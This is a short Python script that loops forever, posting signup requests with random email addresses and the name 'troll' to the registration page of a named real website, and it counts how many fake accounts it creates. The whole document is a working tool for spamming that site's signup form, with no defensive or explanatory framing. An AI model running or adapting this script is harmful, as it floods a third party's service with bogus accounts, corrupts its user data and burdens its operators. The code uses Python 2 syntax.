import requests,random,string

def randomword(length):
   return ''.join(random.choice(string.lowercase) for i in range(length))

cnt=0
while (1==1):
    email = randomword(random.randint(4,10)) + '@' + randomword(4) + '.com'
    payload= {'action' : 'signup',
          'email' : email,
          'passw' : '654321',
          'rpassw' : '654321',
          'fname' : 'troll',
          'lname' : 'troll',
          'college' : 'troll',
          'branch' : 'troll',
          'contact' : '9999999999',
          'sex':'male'
          }

    r = requests.post('http://technovanza.org/signinsignup.php',data=payload)

    if (r.text == "success"):
        cnt += 1
    print r.text, cnt, email
